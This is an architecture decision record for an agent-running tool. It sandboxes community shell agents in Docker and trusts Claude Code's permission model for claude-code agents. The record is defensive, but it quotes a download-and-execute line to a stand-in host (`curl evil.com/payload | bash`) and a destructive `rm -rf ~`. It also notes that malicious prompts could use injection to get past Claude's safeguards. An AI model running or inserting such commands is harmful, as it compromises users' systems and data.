# ADR-0005: Shell agents sandboxed in Docker; claude-code agents on host

## Status
Accepted

## Context

Agents come from three sources: `agents/examples/` (ships with the repo),
`agents/local/` (user-written), and `agents/community/` (contributed, in
the repo catalog but not installed until the user opts in). Community
shell agents could contain `curl evil.com/payload | bash`.

Two axes of exposure:

1. **Shell agents** — deterministic and inspectable. Reading the YAML tells
   you exactly what will run.
2. **Claude-code agents** — non-deterministic. Claude decides what to do
   with the prompt. Even a benign-looking prompt can invoke any tool
   Claude has available.

The outside-voice review called the current approach "backwards" — shell is
the safer type and we sandbox it; claude-code is the riskier type and we
trust it. Fair point. But sandboxing claude-code agents is meaningfully
harder: Claude needs the user's API key, Claude's config directory, and
often the user's working directory to be useful. Any Docker sandbox that
mounts all of that gives the container everything it would need to do
damage anyway.

Meanwhile, Claude Code already has a **permission model** — tool
allowlists, working directory scoping, `--allowedTools` flag. These are
enforced by Claude itself, not by the sandbox.

## Decision

**Shell agents** run in a Docker sandbox (restricted container, read-only
working directory mount, network isolation). Applies especially to agents
loaded from `agents/community/` that the user opted into installing.

**Claude-code agents** run on the host. Claude's own permission model
(allowedTools, working directory scoping) is the sandbox. Docs explicitly
name this trust boundary.

## Consequences

**Easier:**
- Shell agents from the community catalog can't `rm -rf ~` by accident.
- Claude-code agents work without API key leakage into a container.
- No dual-maintenance burden: the shell sandbox doesn't need a way to
  tunnel Claude creds through.

**Harder:**
- Users must understand the trust-boundary distinction when writing agents
  or importing them. The CONTRIBUTING.md security checklist calls this out.
- A determined attacker writing a malicious claude-code agent prompt could
  attempt prompt injection to bypass Claude's safeguards. That's Claude's
  problem, not ours — but it's a consequence.

**Trade-offs accepted:**
- Sandboxing claude-code agents more aggressively is future work, and would
  require Anthropic changes (ephemeral credentials, scoped tokens) to be
  meaningfully stronger than what Claude already provides.
